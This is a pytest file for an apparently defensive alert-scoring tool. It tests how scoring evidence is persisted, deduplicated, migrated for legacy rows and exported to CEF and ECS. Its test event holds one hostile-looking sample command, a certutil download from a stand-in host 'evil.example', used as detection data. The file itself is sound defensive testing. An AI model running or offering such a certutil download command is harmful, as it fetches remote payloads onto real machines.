"""
Scoring evidence persistence and export band tests (finding E1).

Stored alerts must keep their v2 scoring evidence (risk_band,
scoring_version, subscores, breakdown). Export must use that evidence,
and derive a band from the score for rows that predate scoring, instead
of defaulting every database row to the "low" band.
"""
import sqlite3
from datetime import datetime

import pytest

from collectors.base import Event
from core.database import AlertDatabase
from core.engine import Alert
from core.export import to_cef, to_ecs
from core.scorer import Scorer, risk_band_for_score


def _event() -> Event:
    return Event(
        timestamp=datetime(2026, 3, 1, 9, 30, 0),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.example/p",
        user="baduser",
        process_id=4321,
        parent_process_name="cmd.exe",
    )


def _make_alert(score=130, band="critical", version=2, breakdown=None) -> Alert:
    event = _event()
    return Alert(
        rule_id="WIN-001",
        rule_name="Certutil Download",
        severity="high",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1105"],
        description="Suspicious certutil download",
        response=["Investigate"],
        score=score,
        risk_band=band,
        scoring_version=version,
        severity_subscore=100 if version >= 2 else 0,
        confidence_subscore=85 if version >= 2 else 0,
        score_breakdown=breakdown or {"model": "v2", "raw_score": 130.0},
    )


@pytest.fixture
def temp_db(tmp_path):
    db = AlertDatabase(str(tmp_path / "scoring.db"))
    yield db
    db.close()


def _cef_severity(line: str) -> str:
    return line.split("|")[6]


def test_save_alert_persists_scoring_evidence(temp_db):
    """A saved alert keeps band, version, subscores, and breakdown."""
    temp_db.save_alert(_make_alert())

    stored = temp_db.get_alerts()[0]
    assert stored["score"] == 130
    assert stored["risk_band"] == "critical"
    assert stored["scoring_version"] == 2
    assert stored["severity_subscore"] == 100
    assert stored["confidence_subscore"] == 85
    assert stored["score_breakdown"] == {"model": "v2", "raw_score": 130.0}


def test_dedup_episode_persists_scoring_evidence(temp_db):
    """The deduplicated insert path stores the same evidence."""
    result = temp_db.save_alert_dedup(_make_alert(score=95, band="high"))
    assert result["alert_id"] is not None

    stored = temp_db.get_alerts()[0]
    assert stored["risk_band"] == "high"
    assert stored["scoring_version"] == 2
    assert stored["score_breakdown"] == {"model": "v2", "raw_score": 130.0}


def test_dedup_upgrade_refreshes_scoring_evidence(temp_db):
    """When a duplicate raises the score, the evidence follows the winner."""
    temp_db.save_alert_dedup(_make_alert(score=60, band="medium"))

    result = temp_db.save_alert_dedup(
        _make_alert(score=130, band="critical", breakdown={"model": "v2", "raw_score": 130.0})
    )
    assert result["is_duplicate"] is True

    stored = temp_db.get_alerts()[0]
    assert stored["score"] == 130
    assert stored["risk_band"] == "critical"
    assert stored["score_breakdown"] == {"model": "v2", "raw_score": 130.0}


def test_export_uses_persisted_risk_band(temp_db):
    """Export carries the stored band, not the old low default."""
    temp_db.save_alert(_make_alert(score=130, band="critical"))

    record = temp_db.get_alerts()[0]
    line = to_cef(record)
    assert _cef_severity(line) == "10"

    doc = to_ecs(record)
    assert doc["lotl"]["risk_band"] == "critical"


def test_export_derives_band_for_row_without_evidence(temp_db):
    """Rows without stored evidence get a band from their score, not low."""
    cursor = temp_db.connection.cursor()
    cursor.execute("""
        INSERT INTO alerts (
            rule_id, rule_name, severity, score, platform,
            process_name, command_line, user, timestamp
        ) VALUES ('WIN-001', 'Legacy', 'high', 95, 'windows',
                  'certutil.exe', 'cmd', 'user', '2026-03-01 09:30:00')
    """)
    temp_db.connection.commit()

    record = temp_db.get_alerts()[0]
    assert record["risk_band"] == "high"

    line = to_cef(record)
    assert _cef_severity(line) == "8"

    doc = to_ecs(record)
    assert doc["lotl"]["risk_band"] == "high"


def test_migration_backfills_risk_band_for_legacy_rows(tmp_path):
    """Populated legacy databases get a derived band, not NULL."""
    path = str(tmp_path / "legacy.db")
    conn = sqlite3.connect(path)
    conn.execute("""
        CREATE TABLE alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            rule_id TEXT NOT NULL, rule_name TEXT NOT NULL,
            severity TEXT NOT NULL, score INTEGER NOT NULL,
            platform TEXT NOT NULL, process_name TEXT NOT NULL,
            command_line TEXT NOT NULL, user TEXT NOT NULL,
            parent_process_name TEXT, timestamp DATETIME NOT NULL,
            mitre_attack TEXT, description TEXT, response TEXT,
            event_data TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.execute("""
        INSERT INTO alerts (
            rule_id, rule_name, severity, score, platform,
            process_name, command_line, user, timestamp
        ) VALUES ('WIN-001', 'Legacy', 'high', 130, 'windows',
                  'certutil.exe', 'cmd', 'user', '2026-01-01 10:00:00')
    """)
    conn.commit()
    conn.close()

    db = AlertDatabase(path)
    try:
        row = db.connection.execute(
            "SELECT risk_band, scoring_version FROM alerts"
        ).fetchone()
        assert row[0] == "critical"
        assert row[1] == 1
    finally:
        db.close()


def test_risk_band_function_matches_scorer():
    """The shared band function agrees with the Scorer's mapping."""
    scorer = Scorer()
    for score in (0, 59, 60, 89, 90, 119, 120, 150):
        assert risk_band_for_score(score) == scorer._risk_band(score)
